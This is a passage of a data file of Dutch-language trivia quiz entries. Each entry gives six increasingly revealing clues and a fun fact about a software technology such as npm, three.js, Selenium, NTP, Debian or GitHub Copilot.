      'In 2016 zorgde het verwijderen van een package van elf regels, left-pad, wereldwijd voor kapotte builds.',
      'GitHub, en daarmee Microsoft, kocht het bedrijf erachter in 2020.',
      'Het leest package.json en vult een map die node_modules heet.',
      'Het wordt met Node.js meegeleverd, en broertje npx draait packages zonder ze te installeren.',
      'De standaard pakketbeheerder voor JavaScript, met een naam van drie kleine letters.'
    ],
    funFact: 'Officieel is de naam geen afkorting, en de website grapt al jaren over waar het voor zou kunnen staan.'
  },
  286: {
    clues: [
      'Ricardo Cabello, beter bekend als Mr.doob, begon eraan in 2010.',
      'Het werd eerst in ActionScript geschreven, voordat het naar JavaScript ging.',
      'Elk project heeft een scene, een camera en een renderer nodig.',
      'Het verbergt de meeste pijn van kale WebGL.',
      'Talloze 3D-productviewers en bekroonde websites gebruiken het.',
      'De JavaScript-library voor 3D met een getal in de naam.'
    ],
    funFact: 'De maker heet online Mr.doob, en zijn site met experimenten was een etalage voor vroege 3D in de browser.'
  },
  287: {
    clues: [
      'Jason Huggins begon ermee bij ThoughtWorks in 2004.',
      'De naam was een grap over een concurrerend product van Mercury Interactive.',
      'De WebDriver-API werd in 2018 een W3C-standaard.',
      'Grid draait de tests parallel op veel browsers en machines.',
      "Zo'n vijftien jaar lang was het dé tool voor het automatisch testen van browsers.",
      'De tool voor browserautomatisering genoemd naar een scheikundig element.'
    ],
    funFact: 'De naam was een grap: het element seleen wordt gebruikt tegen kwikvergiftiging, en de grote concurrent was toen Mercury Interactive.'
  },
  288: {
    clues: [
      'David L. Mills ontwierp het begin jaren 80.',
      'Het is een van de oudste internetprotocollen die nog in gebruik zijn.',
      'De servers zijn ingedeeld in strata, met atoomklokken en GPS op stratum 0.',
      'Het gebruikt UDP-poort 123.',
      'Het houdt de klok van je computer tot op milliseconden nauwkeurig.',
      'Het Network Time Protocol.'
    ],
    funFact: "De maker, David Mills, kreeg voor dit werk de bijnaam 'Father Time'."
  },
  289: {
    clues: [
      'Het bedrijf van Paul Dix bracht het in 2013 uit.',
      'Het is gemaakt voor data met een tijdstempel, zoals sensorwaarden en metrics.',
      "Data wordt geschreven in een simpel 'line protocol'.",
      'Het was in Go geschreven, en de derde versie werd in Rust herbouwd.',
      'Het was de I in de TICK-stack.',
      'De time-seriesdatabase met een naam die een toestroom betekent.'
    ],
    funFact: 'De TICK-stack stond voor Telegraf, deze database, Chronograf en Kapacitor.'
  },
  290: {
    clues: [
      'Mike Bostock, Vadim Ogievetsky en Jeff Heer brachten het in 2011 uit aan Stanford.',
      'Het volgde een eerdere visualisatietoolkit op die Protovis heette.',
      'De data joins draaien om enter, update en exit.',
      'Het tekent grafieken meestal door data aan SVG-elementen te koppelen.',
      'De hoofdauteur maakte er veel interactieve graphics mee voor The New York Times.',
      'De Data-Driven Documents-library.'
    ],
    funFact: 'Mike Bostock richtte later Observable op, een notebookplatform om data te verkennen met JavaScript.'
  },
  291: {
    clues: [
      'Damien Katz begon eraan in 2005, en in 2008 ging het naar Apache.',
      'Het is geschreven in Erlang.',
      'Elk document is JSON, en je praat ermee via gewone HTTP.',
      'De replicatie werkt zelfs tussen servers die vaak offline zijn.',
      "De slogan was simpelweg 'Relax'.",
      'De documentdatabase met een naam die aan een bank doet denken.'
    ],
    funFact: 'De naam zou staan voor Cluster Of Unreliable Commodity Hardware.'
  },
  292: {
    clues: [
      'Abhay Bhushan beschreef het voor het eerst in RFC 114, in 1971.',
      'Daarmee is het ouder dan TCP/IP zelf.',
      "Het gebruikt één verbinding voor commando's en een aparte voor data.",
      "De modi 'active' en 'passive' bestaan vanwege firewalls.",
      'Chrome en Firefox haalden de ondersteuning er allebei in 2021 uit.',
      'Het File Transfer Protocol.'
    ],
    funFact: "Veel servers stonden 'anonymous' logins toe, waarbij je je e-mailadres als wachtwoord intypte."
  },
  293: {
    clues: [
      'Oud-Google-engineers richtten het bedrijf in 2015 op.',
      'Het werd geïnspireerd door de wereldwijd verspreide database van Google, Spanner.',
      'Het spreekt het wire protocol van Postgres.',
      "Het verspreidt data over nodes en regio's en overleeft het als er een paar wegvallen.",
      'De naam suggereert dat het net zo moeilijk kapot te krijgen is als een bepaald insect.',
      'De gedistribueerde SQL-database genoemd naar een beruchte taaie kakkerlak.'
    ],
    funFact: 'Twee van de oprichters, Spencer Kimball en Peter Mattis, maakten als student in Berkeley de beeldbewerker GIMP.'
  },
  294: {
    clues: [
      'Ryan Carniato maakte het, en in 2021 bereikte het versie 1.0.',
      'Het gebruikt JSX maar heeft geen virtuele DOM.',
      'Componenten draaien maar één keer; fijnmazige signals werken de DOM direct bij.',
      'State maak je met createSignal, dat een getter en een setter teruggeeft.',
      'De aanpak met signals beïnvloedde Angular, Preact en een voorstel voor JavaScript zelf.',
      'De reactieve UI-library met een Engelse naam die vast betekent, niet vloeibaar.'
    ],
    funFact: 'De maker benchmarkte jarenlang UI-frameworks, en zijn eigen framework staat vaak bovenaan de JS Framework Benchmark.'
  },
  295: {
    clues: [
      'NVIDIA bracht het uit in 2007.',
      "Je schrijft er algemene programma's mee voor videokaarten, in C++.",
      'Kernels worden gestart met een speciale syntax: <<<blocks, threads>>>.',
      "AlexNet, dat in 2012 de deep-learninghype begon, werd ermee getraind op twee gaming-GPU's.",
      'Het software-ecosysteem wordt vaak de grootste slotgracht van NVIDIA genoemd.',
      'Het parallelle rekenplatform van NVIDIA, kort voor Compute Unified Device Architecture.'
    ],
    funFact: "AlexNet werd getraind op twee NVIDIA GTX 580-videokaarten, en de winst in 2012 maakte GPU's de standaardhardware voor AI."
  },
  296: {
    clues: [
      'Olivier Pomel en Alexis Lê-Quôc richtten het op in New York in 2010.',
      'De oprichters wilden ontwikkelaars en operationsteams samenbrengen op één dashboard.',
      'Een agent op elke host stuurt er metrics, traces en logs naartoe.',
      'De rekeningen zijn een populair onderwerp van geklaag onder engineers.',
      'Het is een van de grootste SaaS-bedrijven voor monitoring en observability.',
      'De monitoringdienst met een paarse hond als logo.'
    ],
    funFact: 'De paarse mascottehond heet Bits.'
  },
  297: {
    clues: [
      'De eerste versie, in 1985, kon zijn eigen vensters nog niet eens laten overlappen.',
      'De lancering in 1995 gebruikte een nummer van de Rolling Stones over opstarten.',
      'De moderne versies zijn gebouwd op de NT-kernel.',
      'De instellingen staan al lang in een database die het register heet.',
      'Als het hard crasht, zie je een blauw scherm.',
      'Het besturingssysteem van Microsoft, met de Engelse naam voor vensters.'
    ],
    funFact:
      "Microsoft zou miljoenen hebben betaald om 'Start Me Up' van de Rolling Stones te gebruiken in de lanceringscampagne van 1995, om de nieuwe Startknop te promoten."
  },
  298: {
    clues: [
      'Google maakte het in 2010 beschikbaar, gebaseerd op het interne systeem Dremel.',
      'Het is serverless: er zijn geen machines om te beheren.',
      'Je betaalt naar de hoeveelheid data die je queries doorzoeken.',
      'Het host publieke datasets, van GitHub-activiteit tot weergegevens.',
      'Analisten doorzoeken terabytes in seconden met gewone SQL.',
      'Het datawarehouse van Google Cloud, met een naam die grote vragen belooft.'
    ],
    funFact: 'Een onoplettende SELECT * op een enorme tabel kan echt geld kosten, omdat je betaalt voor elke byte die wordt doorzocht.'
  },
  299: {
    clues: [
      'Tom Preston-Werner, Chris Wanstrath en PJ Hyett lanceerden het in 2008.',
      'De mascotte is een wezen dat half kat, half octopus is.',
      'Het maakte de pull request dé manier om bij te dragen aan open source.',
      'Microsoft kocht het in 2018 voor 7,5 miljard dollar.',
      'De groene contributiegrafiek laat zien hoe actief je het hele jaar was.',
      'Het grootste platform voor codehosting, met de Octocat als logo.'
    ],
    funFact: 'In 2020 bewaarde het een momentopname van publieke repositories op archieffilm in een oude mijn op Spitsbergen, bedoeld om 1000 jaar mee te gaan.'
  },
  300: {
    clues: [
      'Sebastián Ramírez bracht het in 2018 uit.',
      'Het gebruikt type hints van Python om requests te valideren met Pydantic.',
      'Het is gebouwd op Starlette en ondersteunt async direct.',
      'Het genereert gratis interactieve OpenAPI-documentatie op /docs.',
      "Het werd snel een van de populairste manieren om API's te bouwen in Python.",
      "Het Python-framework voor API's met een naam die snelheid belooft."
    ],
    funFact: 'In 2020 grapte de maker over een vacature die vier jaar of meer ervaring ermee vroeg, terwijl het pas ongeveer anderhalf jaar bestond.'
  },
  301: {
    clues: [
      'Google kondigde het aan op de I/O-conferentie in 2013.',
      'Het is gebouwd op de opensource-editie van de Java-IDE van JetBrains.',
      'Het verving een set Eclipse-plug-ins als officiële manier om voor zijn platform te bouwen.',
      'Sinds 2020 zijn versies genoemd naar dieren in alfabetische volgorde, te beginnen met Arctic Fox.',
      'Het heeft een emulator, een layout-editor en builds met Gradle.',
      'De officiële IDE van Google om Android-apps te bouwen.'
    ],
    funFact: 'De releasenamen lopen door het alfabet: Arctic Fox, Bumblebee, Chipmunk, Dolphin, Electric Eel, Flamingo, Giraffe, Hedgehog enzovoort.'
  },
  302: {
    clues: [
      'Microsoft bracht de eerste versie in 2002 uit.',
      'Code compileert naar een tussentaal die door de Common Language Runtime wordt uitgevoerd.',
      "In 2016 kwam een cross-platform opensource-herschrijving met 'Core' in de naam.",
      'Toen de twee versies in 2020 samengingen, werd versienummer 4 overgeslagen.',
      'C#, F# en Visual Basic draaien er allemaal op, en packages komen van NuGet.',
      'Het ontwikkelplatform van Microsoft, met een naam die met een punt begint.'
    ],
    funFact: 'De samengevoegde release in 2020 heette versie 5; 4 werd overgeslagen om verwarring met het oude Framework 4.x te voorkomen.'
  },
  303: {
    clues: [
      'Andrey Sitnik maakte het in 2013.',
      'Het leest stylesheets in als boom en laat plug-ins die aanpassen.',
      'De bekendste plug-in voegt automatisch vendor prefixes toe.',
      'Tailwind CSS versie 3 werd meestal als een van de plug-ins geïnstalleerd.',
      'Het is minder een preprocessor dan een platform voor tools die stijlen omvormen.',
      'De CSS-tool met een naam die suggereert dat hij na CSS komt.'
    ],
    funFact: 'De maker schreef ook Autoprefixer, en Nano ID, een piepkleine ID-generator.'
  },
  304: {
    clues: [
      'Het werd in 1993 voor het eerst vastgelegd als opvolger van BOOTP.',
      'De uitwisseling in vier stappen heeft de bijnaam DORA: Discover, Offer, Request, Acknowledge.',
      'Adressen worden uitgedeeld als leases die verlopen.',
      'Het gebruikt de UDP-poorten 67 en 68.',
      'Je router thuis gebruikt het om elk apparaat een IP-adres te geven.',
      'Het Dynamic Host Configuration Protocol.'
    ],
    funFact: 'Een nieuw apparaat dat nog niet eens een IP-adres heeft, begint het gesprek met een broadcast naar het hele netwerk.'
  },
  305: {
    clues: [
      'Martin Fowler bedacht de term in 2004 in een artikel over inversion-of-control-containers.',
      "James Shore noemde het 'een term van 25 dollar voor een concept van 5 cent'.",
      'Een klasse krijgt wat ze nodig heeft, in plaats van het zelf te maken.',
      'Het maakt het makkelijk om een echte service te vervangen door een testversie.',
      'Spring, Angular en ASP.NET Core hebben er ingebouwde containers voor.',
      'De afhankelijkheden van een object van buitenaf aanreiken.'
    ],
    funFact: 'De simpelste vorm heeft helemaal geen framework nodig: geef gewoon mee wat een klasse nodig heeft aan de constructor.'
  },
  306: {
    clues: [
      'Lennart Poettering en Kay Sievers begonnen eraan bij Red Hat in 2010.',
      'Het verving de oude System V-initscripts op de meeste Linux-distributies.',
      'Services worden beschreven in unitbestanden, en het draait als PID 1.',
      'Je bestuurt het met systemctl en leest de logs met journalctl.',
      'Weinig onderdelen van Linux hebben voor zulke felle discussies gezorgd.',
      "Het init-systeem en de servicemanager van Linux met een naam die op een kleine 'd' eindigt."
    ],
    funFact: "De naam wordt officieel met kleine letters geschreven en knipoogt ook naar 'Système D', Frans voor je redden met wat je hebt."
  },
  307: {
    clues: [
      'Ian Murdock kondigde het aan in augustus 1993.',
      'De naam combineert de namen van de oprichter en zijn toenmalige vriendin, Debra.',
      'De releases zijn genoemd naar personages uit Toy Story, zoals Bookworm en Trixie.',
      'De unstable-tak heet altijd Sid, naar het jongetje dat speelgoed slopt.',
      'Pakketten eindigen op .deb en worden beheerd met apt.',
      'De Linux-distributie van de community waarop Ubuntu is gebaseerd.'
    ],
    funFact: 'De unstable-tak heet voorgoed Sid, naar het buurjongetje in Toy Story dat speelgoed kapotmaakt.'
  },
  308: {
    clues: [
      'Google bracht versie 1.0 uit in 2021.',
      'UI wordt gebouwd uit Kotlin-functies die met een annotatie zijn gemarkeerd.',
      "Als de state verandert, draaien de betrokken functies opnieuw: 'recomposition'.",
      'Het vervangt XML-layoutbestanden op Android.',
      'De multiplatformversie van JetBrains draait ook op iOS en desktop.',
      'De moderne declaratieve UI-toolkit van Android, met een vliegende rugzak als eerste woord.'
    ],
    funFact: 'Het cross-platform broertje van JetBrains laat dezelfde UI-code draaien op Android, iOS, desktop en het web.'
  },
  309: {
    clues: [
      'Facebook bracht het in 2016 uit, samen met Exponent, Google en Tilde.',
      'Het had een lockfile voordat de concurrent die had.',
      "De tweede grote versie, bijnaam Berry, bracht Plug'n'Play zonder node_modules.",
      'Als je het zonder argumenten draait, installeert het alle dependencies.',
      'Jarenlang was het het snellere alternatief voor npm.',
      'De JavaScript-pakketbeheerder genoemd naar het Engelse woord voor breigaren.'
    ],
    funFact: "Het idee van de lockfile was zo'n succes dat npm een jaar later in versie 5 package-lock.json toevoegde."
  },
  310: {
    clues: [
      'Het Zweedse bedrijf erachter werd in 2007 opgericht.',
      'Het slaat nodes en relaties op in plaats van tabellen.',
      'De querytaal, Cypher, tekent patronen in ASCII-art: (a)-[:KNOWS]->(b).',
      'Journalisten gebruikten het om de Panama Papers te ontrafelen.',
      'Het is de bekendste graafdatabase.',
      'De graafdatabase met een cijfer en één losse letter in de naam.'
    ],
    funFact: 'Het ICIJ gebruikte het om de verbanden in 11,5 miljoen gelekte documenten van de Panama Papers in kaart te brengen.'
  },
  311: {
    clues: [
      'Oud-Google-engineers begonnen eraan bij SoundCloud in 2012.',
      'Het werd geïnspireerd door het interne monitoringsysteem van Google, Borgmon.',
      'Het haalt metrics op bij HTTP-endpoints in plaats van te wachten tot ze gepusht worden.',
      'De querytaal heet PromQL.',
      'Het was na Kubernetes het tweede project dat afstudeerde bij de Cloud Native Computing Foundation.',
      'Het monitoringsysteem genoemd naar de Titaan die het vuur van de goden stal.'
    ],
    funFact: 'Het studeerde in 2018 af bij de CNCF, als tweede project ooit, direct na Kubernetes.'
  },
  312: {
    clues: [
      'Het kwam in 2005 uit Microsoft Research in Cambridge, Engeland.',
      'Het hoort bij de ML-familie en is nauw verwant aan OCaml.',
      'Het kan eenheden controleren, dus meters optellen bij seconden is een compileerfout.',
      'De pipe-operator |> geeft een waarde door aan de volgende functie.',
      'Het is de functionele taal van .NET, ontworpen door Don Syme.',
      'De .NET-taal genoemd naar een muzieknoot, een broertje van C#.'
    ],
    funFact: 'Don Syme hielp ook generics voor .NET 2.0 ontwerpen, dus C#-programmeurs gebruiken zijn werk elke dag.'
  },
  313: {
    clues: [
      'Rich Harris bracht het in 2015 uit.',
      'Het was vanaf het begin gebouwd rond ES-modules.',
      "Het maakte de term 'tree-shaking' populair voor het weghalen van ongebruikte code.",
      'Het werd de favoriete bundler voor libraries in plaats van apps.',
      'Vite gebruikte het voor productiebuilds.',
      'De JavaScript-bundler met een Engelse naam die ook een opgerolde snack beschrijft.'
    ],
    funFact: 'De maker bouwde later Svelte, en voor Vite wordt nu een opvolger in Rust ontwikkeld die Rolldown heet.'
  },
  314: {
    clues: [
      'Nick Downie bracht het in 2013 uit.',
      'Het tekent op een HTML-canvas in plaats van met SVG.',
      'Je geeft het een type, een data-object en een opties-object.',
      'Bar, line, pie, doughnut en radar zijn ingebouwde types.',
      'Het is een van de simpelste manieren om een grafiek aan een webpagina toe te voegen.',
      'De populaire JavaScript-library voor grafieken met een naam die precies zegt wat het doet.'
    ],
    funFact: 'Omdat het op canvas tekent, is een grafiek gewoon pixels; dat houdt het snel bij veel punten, maar lastiger om met CSS op te maken.'
  },
  315: {
    clues: [
      'Een bedrijf dat Deis heette, kondigde het in 2015 aan.',
      'De pakketten heten charts.',
      'Je overschrijft de standaardwaarden van een chart in values.yaml.',
      'De derde versie haalde het servercomponent Tiller weg.',
      'Het noemt zichzelf de pakketbeheerder voor Kubernetes.',
      'De Kubernetes-tool met de Engelse naam van het roer van een schip.'
    ],
    funFact: 'Het volgt het zeevaartthema van Kubernetes: Kubernetes is Grieks voor stuurman, en deze tool is het roer.'
  },
  316: {
    clues: [
      'Het werd in 2011 gepresenteerd op een conferentie in Aarhus, Denemarken.',
      'De makers hoopten dat browsers het ooit rechtstreeks zouden draaien in plaats van JavaScript.',
      'Een speciale versie van Chromium, ernaar vernoemd, had de virtuele machine ingebouwd.',
      'De packages worden gepubliceerd op pub.dev.',
      'Flutter-apps worden erin geschreven.',
      'De clienttaal van Google, genoemd naar een pijltje dat je naar een bord gooit.'
    ],
    funFact: 'Google liet het plan om de virtuele machine in Chrome te stoppen in 2015 varen, en richtte zich op compileren naar JavaScript en native code.'
  },
  317: {
    clues: [
      'Het werd rond 2007 bij Yahoo ontwikkeld.',
      'Het slaat kleine stukjes coördinatiedata op in een boom van nodes.',
      'Gedistribueerde systemen gebruiken het voor leiderverkiezing, locks en configuratie.',
      'Kafka was er jarenlang van afhankelijk, tot versie 4.0 het eindelijk verwijderde.',
      'Het is genoemd naar de taak om te zorgen voor de naar dieren genoemde projecten van Hadoop.',
      'De coördinatiedienst van Apache met de Engelse naam van een dierenverzorger.'
    ],
    funFact: 'De naam past bij een Hadoop-ecosysteem vol dierennamen, zoals Pig en de Hadoop-olifant zelf.'
  },
  318: {
    clues: [
      'Het begon in 2011 als de tweede versie van een framework dat SproutCore heette.',
      'Yehuda Katz en Tom Dale horen bij de makers.',
      'Het staat bekend om convention over configuration en sterke stabiliteitsbeloftes.',
      'De templates groeiden uit Handlebars, en het heeft een eigen CLI.',
      'De mascotte is een hamster die Tomster heet.',
      'Het ambitieuze JavaScript-framework genoemd naar een gloeiend stukje kool.'
    ],
    funFact: 'LinkedIn en de webversie van Apple Music hebben het allebei gebruikt.'
  },
  319: {
    clues: [
      'Doug Cutting en Mike Cafarella haalden het in 2006 uit de zoekmachine Nutch.',
      'Het was gebaseerd op twee papers van Google: een over een bestandssysteem, een over MapReduce.',
      'Yahoo was in het begin de grootste gebruiker en geldschieter.',
      'Het gedistribueerde bestandssysteem heet HDFS.',
      "Het begon eind jaren 2000 het 'big data'-tijdperk.",
      'Het big-dataframework genoemd naar een geel speelgoedolifantje.'
    ],
    funFact: 'Doug Cutting noemde het naar het gele speelgoedolifantje van zijn zoon.'
  },
  320: {
    clues: [
      'Versie 1.0 kwam uit in 2022.',
      'De backend is in Rust geschreven.',
      'In plaats van een browser mee te leveren, gebruikt het de webview van het besturingssysteem.',
      'Apps zijn soms maar een paar megabyte, terwijl concurrenten er meer dan honderd leveren.',
      'Versie 2, uit 2024, voegde iOS en Android toe.',
      'Het alternatief voor Electron op basis van Rust, voor desktopapps met webtechniek.'
    ],
    funFact: 'Omdat het geen Chromium meelevert, kan een simpele app kleiner zijn dan één afbeelding op veel websites.'
  },
  321: {
    clues: [
      'Red Hat begon eraan rond 2018.',
      'Anders dan de bekendste concurrent heeft het geen achtergrond-daemon nodig.',
      'Het kan containers draaien als gewone gebruiker, zonder root.',
      'Het kan containers groeperen in pods, zoals Kubernetes doet.',
      'Veel mensen maken er gewoon een alias van docker naar.',
      'De container-engine zonder daemon, met een naam die met Pod begint.'
    ],
    funFact: "De commandline lijkt zo op die van Docker dat 'alias docker=podman' een bekende tip is in de documentatie."
  },
  322: {
    clues: [
      'GitHub maakte het in 2013 voor zijn eigen code-editor.',
      'Het heette eerst Atom Shell.',
      'Het stopt Chromium en Node.js in elke app.',
      'VS Code, Slack en de desktopapp van Discord zijn erop gebouwd.',
      'Critici klagen dat elke app een complete browser meelevert.',
      'Het framework voor desktopapps met webtechniek, genoemd naar een subatomair deeltje.'
    ],
    funFact: 'De editor Atom waarvoor het gebouwd werd, stopte in 2022, maar het framework leeft voort in veel populaire apps.'
  },
  323: {
    clues: [
      'De maker nam ongeveer twee jaar onbetaald vrij om het te bouwen.',
      'Het verscheen in 2007, en de talks van de maker over eenvoud werden beroemd.',
      'De datastructuren zijn standaard immutable en persistent.',
      'Het is een Lisp-dialect dat op de virtuele machine van Java draait.',
      'Rich Hickey ontwierp het, en er is een broertje dat naar JavaScript compileert.',
      'De Lisp op de JVM waarvan de naam klinkt als een programmeerterm voor een functie die variabelen vasthoudt.'
    ],
    funFact: 'Rich Hickey koos de naam omdat de letters C, L en J erin zitten, voor C#, Lisp en Java.'
  },
  324: {
    clues: [
      'Kamil Myśliwiec bracht het in 2017 uit.',
      'De architectuur met modules, decorators en dependency injection is geleend van Angular.',
      'Het draait op Express of, als je wilt, Fastify.',
      'Controllers zijn klassen met decorators zoals @Get() en @Post().',
      'Het is een TypeScript-first framework voor server-side Node.js-apps.',
      'Het TypeScript-framework voor Node.js met de Engelse naam van een vogelnest.'
    ],
    funFact: 'Het logo is een rode kat, ook al doet de naam aan een vogel denken.'
  },
  325: {
    clues: [
      'Leslie Lamport maakte het begin jaren 80.',
      "Het is een verzameling macro's bovenop het zetsysteem van Donald Knuth.",
      'Documenten beginnen met \\documentclass en gebruiken \\begin{document}.',
      'De wiskundige opmaak is de gouden standaard voor wetenschappelijke papers.',
      'Met Overleaf schrijf je het samen in de browser.',
      "Het documentopmaaksysteem dat je uitspreekt als 'lah-tek', niet als het rubber."
    ],
    funFact: 'Het onderliggende systeem van Knuth heeft versienummers die naar pi gaan: de huidige is 3.141592653.'
  },
  326: {
    clues: [
      'Chris McCord bracht het in 2014 uit.',
      'Het is geschreven in Elixir en draait op de BEAM.',
      'In 2015 hield het team twee miljoen WebSocket-verbindingen open op één server.',
      "Met LiveView bouw je interactieve pagina's zonder JavaScript te schrijven.",
      'Het is het populairste webframework voor Elixir.',
      'Het Elixir-framework genoemd naar een mythische vogel die uit zijn as herrijst.'
    ],
    funFact: 'De benchmark met twee miljoen verbindingen draaide op één server met 40 cores en 128 GB geheugen.'
  },
  327: {
    clues: [
      'Colin McDonnell bracht het in 2020 uit.',
      'Je beschrijft de vorm van je data één keer, en krijgt zowel validatie als een statisch type.',
      'z.infer maakt van een schema een TypeScript-type.',
      'Aanroepen als z.object({ name: z.string() }) definiëren een schema.',
      'Het is favoriet voor het valideren van formulieren, omgevingsvariabelen en API-input.',
      'De TypeScript-first schemalibrary met een naam van drie letters die met Z begint.'
    ],
    funFact: 'De vierde grote versie, uit 2025, maakte het veel sneller en kleiner.'
  },
  328: {
    clues: [
      'Trygve Reenskaug beschreef het bij Xerox PARC in 1979.',
      "De eerste versie had een vierde deel, 'Editor'.",
      'Het scheidt data, wat de gebruiker ziet, en de logica die invoer afhandelt.',
      'Ruby on Rails en ASP.NET maakten het de standaardmanier om webapps te bouwen.',
      'Django noemt zijn variant MTV.',
      'Model-View-Controller.'
    ],
    funFact: 'Reenskaugs eerste naam ervoor was Thing-Model-View-Editor.'
  },
  329: {
    clues: [
      'Het werd in juni 2021 aangekondigd als technische preview.',
      'De eerste versie draaide op het Codex-model van OpenAI.',
      "Het stelt code voor als grijze 'ghost text' die je met Tab accepteert.",
      'In 2022 werd het voor iedereen beschikbaar, en later kwamen chat- en agentmodi.',
      'Het was een van de eerste AI-codeassistenten die door miljoenen ontwikkelaars werd gebruikt.',
      'De AI-pairprogrammer van GitHub.'
    ],
    funFact: 'De naam maakt van de AI een copiloot, met de ontwikkelaar nog steeds op de stoel van de piloot.'
  },
  330: {
    clues: [
      'Alex Johansson, online bekend als KATT, werd rond 2021 de hoofdontwikkelaar.',
      "Het geeft end-to-end typeveiligheid zonder schema's of codegeneratie.",
      'De server definieert routers en procedures, en de client importeert alleen de types.',
      'Het werd onderdeel van de populaire T3-stack.',
      'Het werkt het best als frontend en backend allebei TypeScript zijn.',
      'De TypeScript-library voor remote procedure calls met een naam die met een kleine t begint.'
    ],
    funFact: 'Hernoem een veld op de server, en de TypeScript-compiler toont direct elke kapotte aanroep in de client.'
  },
  331: {
    clues: [
      'John Mauchly beschreef het in 1946.',
      'Het werkt alleen op data die al gesorteerd is.',
      'Elke stap gooit de helft van wat over is weg, dus het kost O(log n) stappen.',
      'git bisect gebruikt hetzelfde idee om de commit te vinden die iets kapotmaakte.',
      'Zo zoek je een woord op in een papieren woordenboek.',
      'Het zoekalgoritme dat een gesorteerde lijst steeds halveert.'
    ],
    funFact: 'Een bug in de eigen implementatie van Java, die het midden berekende als (low + high) / 2, bleef ongeveer negen jaar onopgemerkt, tot 2006.'
  },
  332: {
    clues: [
      'Het stamt af van NeXTSTEP, dat in 1997 met Steve Jobs mee naar Apple kwam.',
      'De eerste versies waren genoemd naar grote katten, van Cheetah tot Mountain Lion.',
      'Sinds 2013 zijn versies genoemd naar plekken in Californië.',
      'Het is een gecertificeerde UNIX, gebouwd op de Darwin-kernel.',
      'In 2016 verdween de X uit de naam.',
      'Het desktopbesturingssysteem van Apple.'
    ],
    funFact: 'Versie 10 bleef zo lang, van 2001 tot 2020, dat Apple bijna twintig jaar alleen 10.x gebruikte voordat Big Sur 11 werd.'
  },
  333: {
    clues: [
      'Andrew Kelley begon eraan in 2016.',
      'Het heeft geen verborgen control flow, geen verborgen allocaties en geen preprocessor.',
      "Code gemarkeerd met comptime draait tijdens het compileren, in plaats van macro's.",
      'De toolchain werkt ook als vervanger van een C-compiler die makkelijk cross-compileert.',
      'De JavaScript-runtime Bun is erin geschreven.',
      'De systeemtaal met een naam van drie letters die klinkt als zigzag.'
    ],
    funFact: "Veel projecten die er geen regel in schrijven, gebruiken het commando 'zig cc' alleen om C-code te cross-compileren."
  },
  334: {
    clues: [
      'Twee Noorse ontwikkelaars bij Trolltech brachten het in 1995 uit.',
      'Objecten praten met elkaar via signals en slots.',
      'Een preprocessor die moc heet, genereert er extra C++-code voor.',
      "De KDE-desktop is erop gebouwd, en QML beschrijft de moderne UI's.",
      'Het is een cross-platform C++-framework voor grafische apps.',
      "De GUI-toolkit met een naam van twee letters die officieel als 'cute' wordt uitgesproken."
    ],
    funFact: 'De Q werd gekozen omdat de makers de letter mooi vonden in het lettertype van hun editor, en de t staat voor toolkit.'
  },
  335: {
    clues: [
      'Mitchell Hashimoto bracht het in 2010 uit.',
      'Het werd het eerste product van het bedrijf HashiCorp.',
      'Het configuratiebestand is in Ruby geschreven.',
      "Eén commando, gevolgd door 'up', start een volledig ingerichte virtuele machine, vaak op VirtualBox.",
      'Voordat containers het overnamen, was het dé manier om een ontwikkelomgeving te delen.',
      'De VM-tool met een Engelse naam die zwerver betekent.'
    ],
    funFact: 'De maker bouwde later Ghostty, een populaire terminalemulator.'
  },
  336: {
    clues: [
      'Guillermo Rauch richtte het in 2015 op onder de naam ZEIT.',
      'In 2020 kreeg het een nieuwe naam.',
      'Elke pull request krijgt een eigen preview-deployment met een unieke URL.',
      'De AI-tool v0 genereert gebruikersinterfaces uit een prompt.',
      'Het is het bedrijf achter Next.js.',
      'De frontendcloud met een zwarte driehoek als logo.'
    ],
    funFact: 'De oprichter maakte ook Socket.IO, een van de eerste populaire libraries voor realtime webapps.'
  },
  337: {
    clues: [
      'Het idee gaat terug op het netwerkcomputersysteem van Apollo Computer in de jaren 80.',
      'Het is een getal van 128 bits.',
      'Het wordt geschreven als 32 hexadecimale cijfers in groepen van 8-4-4-4-12.',
      'Versie 4 is willekeurig, en versie 7, gestandaardiseerd in 2024, begint met een tijdstempel.',
      'Microsoft noemt het een GUID.',
      'De Universally Unique Identifier.'
    ],
    funFact: 'Je zou ongeveer 85 jaar lang elke seconde een miljard willekeurige versie-4-exemplaren moeten maken voor 50% kans op één dubbele.'
  },
  338: {
    clues: [
      'Een natuurkundige bij CERN beschreef het in 1991 in een document met de eerste tags.',
      'Het was gebaseerd op SGML, een veel oudere manier om documenten op te maken.',
      "Sinds de jaren 2000 is het een 'living standard' die door de WHATWG wordt onderhouden.",
      'Elementen als <blink> en <marquee> hoorden er ooit bij.',
      'Elke webpagina begint ermee, van <!DOCTYPE> tot </body>.',
      'De HyperText Markup Language.'
    ],
    funFact: 'De allereerste website, op info.cern.ch, werd in 2013 door CERN hersteld en is nog steeds te bezoeken.'
  },
  339: {
    clues: [
      'Donald Michie, die codekraker was geweest op Bletchley Park, bedacht de term in 1968.',
      "De naam komt van 'memo', en er ontbreekt bewust een 'r'.",
      'Het bewaart de resultaten van functieaanroepen, op basis van hun argumenten.',
      'Het maakt de naïeve recursieve Fibonacci van exponentieel lineair.',
      'useMemo van React is ernaar genoemd.',
      'De resultaten van een functie cachen, zodat dezelfde invoer nooit twee keer berekend wordt.'
    ],
    funFact: "Het is geen typefout voor 'memorization': het woord komt van 'memo', een briefje om iets te onthouden."
  },
  340: {
    clues: [
      'Het groeide uit de code in het boek over J2EE-ontwerp van Rod Johnson uit 2002.',
      'Het was een lichter alternatief voor Enterprise JavaBeans.',
      'De kern is een inversion-of-control-container voor dependency injection.',
      'Annotaties als @Autowired en @RestController zijn er overal.',
      'Met het Boot-project heb je in een paar minuten een draaiende Java-webservice.',
      'Het Java-framework met de Engelse naam van het seizoen na de winter.'
    ],
    funFact: "De naam zou staan voor een frisse start na de 'winter' van traditionele J2EE-ontwikkeling."
  },
  341: {
    clues: [
      'Allen Newell, Cliff Shaw en Herbert Simon gebruikten het in de jaren 50 voor hun taal IPL.',
      'Elk element wijst naar het volgende.',
      'Vooraan invoegen kost constante tijd, maar het 100e element vinden betekent erheen lopen.',
      'Een dubbel gekoppelde versie wijst ook terug naar het vorige element.',
      "'Draai hem om' is een klassieke vraag bij sollicitatiegesprekken.",
      'De datastructuur van nodes die elk naar de volgende wijzen.'
    ],
    funFact: 'Newell en Simon wonnen later de Turing Award, en Simon won ook een Nobelprijs voor economie.'
  },
  342: {
    clues: [
      'Dylan Field en Evan Wallace richtten het bedrijf in 2012 op.',
